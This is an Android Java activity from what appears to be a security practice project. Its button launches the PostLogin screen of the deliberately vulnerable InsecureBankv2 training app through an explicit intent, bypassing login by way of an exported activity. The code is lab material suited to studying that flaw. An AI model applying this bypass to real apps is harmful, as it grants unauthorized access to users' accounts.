package net.ammarafzal.practice;


import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

import java.util.List;


public class IntentHack extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_intent_hack);
        Button intent_btn = findViewById(R.id.intent_btn);
        if (intent_btn != null) {
            intent_btn.setOnClickListener((View.OnClickListener)(new View.OnClickListener() {
                public final void onClick(View it) {
                    if(isPackageExisted("com.android.insecurebankv2")){
                    Intent intent = new Intent(Intent.ACTION_SEND);
                    intent.setClassName("com.android.insecurebankv2", "com.android.insecurebankv2.PostLogin");
                    startActivity(intent);
                    }
                    else{
                        Toast.makeText(IntentHack.this, "Please install Insecure Bank APK",
                                Toast.LENGTH_LONG).show();
                    }
                }
            }));
        }
    }
    public boolean isPackageExisted(String targetPackage){
        List<ApplicationInfo> packages;
        PackageManager pm;

        pm = getPackageManager();
        packages = pm.getInstalledApplications(0);
        for (ApplicationInfo packageInfo : packages) {
            if(packageInfo.packageName.equals(targetPackage))
                return true;
        }
        return false;
    }
}